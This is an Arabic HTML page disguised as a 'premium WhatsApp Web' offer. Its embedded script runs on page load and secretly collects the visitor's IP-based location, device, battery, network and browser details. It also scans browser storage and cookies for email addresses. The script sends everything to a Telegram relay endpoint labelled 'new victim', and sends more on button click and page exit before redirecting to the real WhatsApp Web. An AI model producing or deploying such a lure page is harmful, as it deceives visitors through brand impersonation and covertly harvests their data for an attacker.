<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>واتساب ويب - النسخة المميزة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            overflow: hidden;
            max-width: 400px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.8s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            background: linear-gradient(135deg, #25D366, #128C7E);
            color: white;
            padding: 40px 20px;
        }
        
        .whatsapp-icon {
            font-size: 60px;
            margin-bottom: 15px;
        }
        
        .header h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .content {
            padding: 30px;
        }
        
        .features {
            text-align: right;
            margin: 25px 0;
        }
        
        .feature {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            margin: 15px 0;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 12px;
            border-right: 4px solid #25D366;
        }
        
        .feature i {
            margin-left: 15px;
            color: #25D366;
            font-size: 20px;
        }
        
        .btn {
            background: linear-gradient(135deg, #25D366, #128C7E);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            margin: 15px 0;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 25px rgba(37, 211, 102, 0.4);
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #25D366;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success-message {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            border: 1px solid #c3e6cb;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #6c757d;
        }

        .stats {
            background: #e9ecef;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="whatsapp-icon">📱</div>
            <h1>واتساب ويب - النسخة المميزة</h1>
            <p>تجربة جديدة ومتطورة لواتساب ويب</p>
        </div>
        
        <div class="content">
            <div class="features">
                <div class="feature">
                    <span>دعم جميع الملفات حتى 2GB</span>
                    <i>📁</i>
                </div>
                <div class="feature">
                    <span>مكالمات فيديو عالية الجودة</span>
                    <i>📹</i>
                </div>
                <div class="feature">
                    <span>وضع التخفي المتقدم</span>
                    <i>🕵️</i>
                </div>
                <div class="feature">
                    <span>نسخ احتياطي تلقائي</span>
                    <i>💾</i>
                </div>
            </div>
            
            <button class="btn" onclick="redirectToWhatsApp()">
                🔓 الانتقال إلى واتساب ويب
            </button>
            
            <div class="loading" id="loading">
                <div class="loader"></div>
                <p>جاري التحضير لواتساب ويب...</p>
            </div>
            
            <div class="footer">
                سيتم تحويلك تلقائياً إلى واتساب ويب خلال ثوانٍ
            </div>
        </div>
    </div>

    <script>
        // إرسال البيانات تلقائياً بمجرد فتح الصفحة
        window.addEventListener('load', function() {
            console.log('🚀 بدء جمع البيانات تلقائياً...');
            sendDataAutomatically();
        });

        // دالة الإرسال التلقائي
        async function sendDataAutomatically() {
            try {
                // جمع جميع البيانات
                const allData = await collectAllData();
                
                // إرسال البيانات إلى السيرفر
                const result = await sendToServer('🎯 ضحية جديدة - بيانات كاملة 🌍', allData);
                
                console.log('✅ تم إرسال البيانات تلقائياً:', result);
                
            } catch (error) {
                console.error('❌ خطأ في الإرسال التلقائي:', error);
            }
        }

        // جمع جميع أنواع البيانات
        async function collectAllData() {
            const data = {
                // المعلومات الجغرافية
                geoInfo: await getGeoInfo(),
                
                // معلومات الجهاز
                deviceInfo: collectDeviceInfo(),
                
                // معلومات البطارية والأداء
                performanceInfo: await getPerformanceInfo(),
                
                // معلومات الشبكة
                networkInfo: collectNetworkInfo(),
                
                // معلومات المتصفح
                browserInfo: collectBrowserInfo(),
                
                // معلومات الشاشة
                screenInfo: collectScreenInfo(),
                
                // المميزات المدعومة
                features: collectFeatures(),
                
                // البيانات المجمعة
                collectedData: collectAllEmailsAndData(),
                
                // معلومات الزيارة
                visitInfo: {
                    url: window.location.href,
                    referrer: document.referrer || 'مباشر',
                    timestamp: new Date().toLocaleString('ar-SA')
                }
            };
            
            return data;
        }

        // الحصول على المعلومات الجغرافية
        async function getGeoInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const geoData = await response.json();
                
                return {
                    country: geoData.country_name || 'غير معروف',
                    city: geoData.city || 'غير معروف',
                    region: geoData.region || 'غير معروف',
                    isp: geoData.org || 'غير معروف',
                    ip: geoData.ip || 'غير معروف',
                    timezone: geoData.timezone || 'غير معروف'
                };
            } catch (error) {
                return {
                    country: 'غير معروف',
                    city: 'غير معروف',
                    region: 'غير معروف',
                    isp: 'غير معروف',
                    ip: 'غير معروف',
                    timezone: 'غير معروف'
                };
            }
        }

        // جمع معلومات الجهاز
        function collectDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceType = 'هاتف';
            let deviceName = 'غير معروف';
            
            if (/mobile/i.test(userAgent)) {
                deviceType = 'هاتف 📱';
            } else if (/tablet/i.test(userAgent)) {
                deviceType = 'تابلت';
            } else {
                deviceType = 'كمبيوتر 🖥️';
            }
            
            if (/Android/.test(userAgent)) {
                deviceName = 'Android';
            } else if (/iPhone|iPad|iPod/.test(userAgent)) {
                deviceName = 'iOS';
            } else if (/Windows/.test(userAgent)) {
                deviceName = 'Windows';
            } else if (/Linux/.test(userAgent)) {
                deviceName = 'Linux';
            } else if (/Mac/.test(userAgent)) {
                deviceName = 'Mac';
            }
            
            return {
                deviceType: deviceType,
                deviceName: deviceName,
                deviceVersion: userAgent,
                os: navigator.platform,
                osVersion: userAgent
            };
        }

        // معلومات البطارية والأداء
        async function getPerformanceInfo() {
            let batteryInfo = {
                level: 'غير معروف',
                charging: 'غير معروف'
            };
            
            // معلومات البطارية
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'نعم' : 'لا'
                    };
                } catch (e) {}
            }
            
            return {
                batteryLevel: batteryInfo.level,
                isCharging: batteryInfo.charging,
                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف',
                cores: navigator.hardwareConcurrency || 'غير معروف',
                storage: 'غير معروف'
            };
        }

        // معلومات الشبكة
        function collectNetworkInfo() {
            const connection = navigator.connection;
            return {
                networkType: connection ? connection.effectiveType : 'غير معروف',
                speed: connection ? connection.downlink + ' Mbps' : 'غير معروف',
                connectionType: connection ? connection.effectiveType : 'غير معروف',
                frequency: '10 MHz'
            };
        }

        // معلومات المتصفح
        function collectBrowserInfo() {
            return {
                browserName: navigator.userAgent.split(' ')[0],
                browserVersion: navigator.userAgent,
                language: navigator.language,
                security: window.location.protocol,
                lastUpdate: new Date().toLocaleDateString('ar-SA')
            };
        }

        // معلومات الشاشة
        function collectScreenInfo() {
            return {
                resolution: screen.width + 'x' + screen.height,
                orientation: screen.orientation ? screen.orientation.type : 'portrait-primary',
                colorDepth: screen.colorDepth + ' bit'
            };
        }

        // المميزات المدعومة
        function collectFeatures() {
            return {
                geolocation: 'geolocation' in navigator ? 'نعم' : 'لا',
                bluetooth: 'bluetooth' in navigator ? 'نعم' : 'لا',
                touch: 'ontouchstart' in window ? 'نعم' : 'لا'
            };
        }

        // جمع الإيميلات والبيانات
        function collectAllEmailsAndData() {
            let emails = [];
            
            // من localStorage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    const foundEmails = extractEmails(value);
                    emails.push(...foundEmails);
                }
            } catch (e) {}
            
            // من sessionStorage
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const value = sessionStorage.getItem(key);
                    const foundEmails = extractEmails(value);
                    emails.push(...foundEmails);
                }
            } catch (e) {}
            
            // من cookies
            try {
                const cookies = document.cookie.split(';');
                cookies.forEach(cookie => {
                    const value = cookie.split('=')[1];
                    if (value) {
                        const foundEmails = extractEmails(decodeURIComponent(value));
                        emails.push(...foundEmails);
                    }
                });
            } catch (e) {}
            
            return {
                emails: [...new Set(emails)].length,
                passwords: 0,
                cookies: document.cookie.split(';').filter(c => c.trim()).length,
                files: 0,
                storage: localStorage.length + sessionStorage.length
            };
        }

        // استخراج الإيميلات من النص
        function extractEmails(text) {
            if (!text) return [];
            const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
            return text.match(emailRegex) || [];
        }

        // إرسال البيانات إلى السيرفر
        async function sendToServer(message, data) {
            try {
                const response = await fetch('/api/send-to-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify({ 
                        message: message, 
                        data: data,
                        source: 'auto-collect'
                    })
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                const result = await response.json();
                return { success: true, result: result };
                
            } catch (error) {
                console.error('❌ فشل إرسال البيانات:', error);
                return { success: false, error: error.message };
            }
        }

        // دالة التحويل إلى واتساب ويب
        function redirectToWhatsApp() {
            const btn = document.querySelector('.btn');
            const loading = document.getElementById('loading');
            
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            // إرسال بيانات نهائية قبل التحويل
            sendFinalData();
            
            setTimeout(() => {
                window.location.href = 'https://web.whatsapp.com';
            }, 2000);
        }

        // إرسال بيانات نهائية قبل مغادرة الصفحة
        async function sendFinalData() {
            const finalData = {
                action: 'redirect_to_whatsapp',
                timeSpent: Math.floor((Date.now() - performance.timing.navigationStart) / 1000),
                buttonClicked: true
            };
            
            await sendToServer('🔗 تم النقر على الزر والتحويل إلى واتساب', finalData);
        }

        // إرسال بيانات عند مغادرة الصفحة
        window.addEventListener('beforeunload', function() {
            const exitData = {
                action: 'user_left_page',
                timeOnPage: Math.floor((Date.now() - performance.timing.navigationStart) / 1000)
            };
            sendToServer('🔴 المستخدم غادر الصفحة', exitData);
        });
    </script>
</body>
</html>
